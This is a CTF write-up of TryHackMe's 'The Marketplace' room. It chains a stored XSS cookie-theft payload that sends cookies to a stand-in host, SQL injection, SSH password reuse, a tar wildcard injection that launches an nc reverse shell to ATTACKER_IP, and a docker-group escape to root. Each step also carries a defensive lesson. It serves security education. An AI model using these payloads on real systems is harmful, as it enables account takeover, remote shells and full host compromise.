# TryHackMe: The Marketplace — Writeup

**Room:** [The Marketplace](https://tryhackme.com/room/marketplace)
**Difficulty:** Medium
**Category:** Web Exploitation, Linux Privilege Escalation, Docker Escape

## Overview

The Marketplace is a Node.js web application vulnerable to a chain of classic
flaws. A **stored XSS** in listings is used to steal an admin's session cookie
via the "report" feature, granting admin access. The admin panel then exposes a
**SQL injection** that leaks an SSH password hidden in a private message.
Password reuse gives SSH access, a **`tar` wildcard injection** in a sudo-allowed
backup script moves laterally to a second user, and that user's membership in the
**`docker` group** is abused to escape to **root**.

## Skills Demonstrated

- Content discovery with `ffuf`
- Stored Cross-Site Scripting (XSS)
- Session hijacking via cookie theft (XSS → attacker listener)
- SQL injection — error-based database enumeration
- Sensitive data exposure (credentials in private messages)
- Credential reuse (web → SSH)
- `tar` wildcard injection for privilege escalation (GTFOBins technique)
- Docker group abuse → container escape → root

---

## 1. Recon & Enumeration

Initial `nmap` scan for open ports and services:

```bash
nmap -sC -sV TARGET_IP
```

With the web service identified, directory brute-forcing with `ffuf` using the
SecLists `raft-medium-directories.txt` wordlist:

```bash
ffuf -u http://TARGET_IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

Nothing high-value surfaced from fuzzing alone, so the focus moved to the
application's own functionality.

## 2. Account Registration & Stored XSS

Registered a new account (`admin:admin`) and explored the app. The core feature
is creating listings for items. Testing the listing body for script injection
with a simple proof-of-concept payload:

```html
<script>alert(1)</script>
```

The payload executed when the listing was viewed — a confirmed **stored XSS**.
Anything rendered to another user's browser was now a potential attack vector.

**Lesson:** User-supplied content rendered without output encoding is stored XSS.
On a multi-user app this is severe: it runs in *other* users' sessions, including
staff.

## 3. Session Hijacking via the "Report" Feature

Each listing has a **Report** button. Reporting a listing causes a privileged
employee/admin to open and review it — meaning my stored XSS would execute in
**their** authenticated browser. I confirmed the behaviour by reporting a test
listing and observing the review flow.

I replaced the PoC with a cookie-exfiltration payload that sends the reviewer's
cookies to my listener:

```html
<script>fetch('http://YOUR_IP:8000/?c=' + document.cookie)</script>
```

Started a listener, created a listing with the payload, and reported it:

```bash
# listener to catch the request containing the cookie
nc -lvnp 8000
```

Within the review interval, the admin's session cookie landed on my listener.
Swapping my own cookie for the stolen one in the browser logged me in **as the
admin**. The admin panel contained the **first flag**.

**Lesson:** Session cookies protecting privileged accounts must be `HttpOnly`
(unreadable by JavaScript). A single stored XSS + an admin who views user content
= full account takeover.

## 4. SQL Injection in the Admin Panel

Inside the admin panel, a user-detail page used a numeric parameter:

```
http://TARGET_IP/admin?user=1
```

Appending a single quote triggered a database error — a classic SQLi indicator:

```
http://TARGET_IP/admin?user=1'
```

With the injection confirmed, I enumerated the database:

- Database: `marketplace`
- Table `users` → dumped all rows: usernames recovered, passwords stored as
  (unusable) hashes
- Table `messages` → the real prize

The `messages` table held a private message containing a **plaintext SSH
password** that had been auto-generated for a user:

```
"An automated system has detected your SSH password is too weak and needs to be
 changed. You have been generated a new temporary password.
 Your new password is: @b_************"
```

**Lesson:** Never transmit credentials in plaintext through in-app messaging, and
never trust "internal only" channels to stay private — a single SQLi exposes all
of it.

## 5. Foothold — SSH via Credential Reuse

I tried the leaked password against the SSH service for each username recovered
from the `users` table. It worked for **jake**:

```bash
ssh jake@TARGET_IP
# password: @b_************
```

The **user flag** was in `jake`'s home directory (`user.txt`).

## 6. Privilege Escalation: jake → michael (tar wildcard injection)

Checked jake's sudo rights:

```bash
sudo -l
# User jake may run the following commands on the-marketplace:
#     (michael) NOPASSWD: /opt/backups/backup.sh
```

Inspecting the script:

```bash
cat /opt/backups/backup.sh
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```

The script runs `tar` with a **wildcard (`*`)** over the current directory. `tar`
interprets filenames that look like options — so by planting files **named** like
`tar` flags, I can make `tar` execute an arbitrary command. The
`--checkpoint-action=exec=` option runs a command, and `--checkpoint=1` triggers
it. This is the classic **GTFOBins tar wildcard** escalation.

I created a reverse-shell script and the two malicious "option" filenames:

```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4445 >/tmp/f' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

With a listener running, I executed the backup script as michael:

```bash
# attacker
nc -lvnp 4445

# jake
sudo -u michael /opt/backups/backup.sh
```

When `tar *` expanded, it picked up the two crafted filenames as options and
executed `shell.sh`, giving a shell as **michael**:

```
uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
```

**Lesson:** `tar *` (or any wildcard) in a script running at higher privilege is
dangerous — an attacker who controls the directory controls the arguments. Use
absolute paths and `--` to end option parsing, or avoid shelling out over
wildcards entirely.

## 7. Privilege Escalation: michael → root (Docker group escape)

michael belongs to the **`docker`** group (`groups ... ,999(docker)`). Docker
group membership is effectively root — the daemon runs as root and can mount the
host filesystem into a container. Listing local images:

```bash
docker image ls
# ... alpine   latest   a24bb4013296 ...
```

I launched an `alpine` container mounting the host's root filesystem and
`chroot`'d into it:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

This drops into a shell as **root** on the host. The **root flag** was in
`/root`.

**Lesson:** Adding a user to the `docker` group grants root-equivalent access.
It should be treated as a privileged assignment; the `-v /:/mnt` + `chroot`
pattern is a well-known, trivial escape.

---

## Summary of the Attack Chain

| # | Vulnerability | Impact |
|---|---|---|
| 1 | Stored XSS in listings | Code execution in other users' sessions |
| 2 | Admin reviews reported listings + non-`HttpOnly` cookie | Admin session theft → admin access (flag 1) |
| 3 | SQL injection in admin panel (`?user=`) | Full DB enumeration |
| 4 | Plaintext SSH password in private messages | Credential disclosure |
| 5 | Password reuse (message → SSH) | Foothold as `jake` (user flag) |
| 6 | `tar *` wildcard in sudo-allowed backup script | Lateral move `jake` → `michael` |
| 7 | `docker` group membership | Container escape → **root** (root flag) |

## Flags

- Flag 1 (admin panel): `THM{redacted}`
- User flag (`jake` — user.txt): `THM{redacted}`
- Root flag (`/root`): `THM{redacted}`

_Flags and the leaked password redacted per CTF writeup etiquette. Complete the
room yourself to retrieve them._
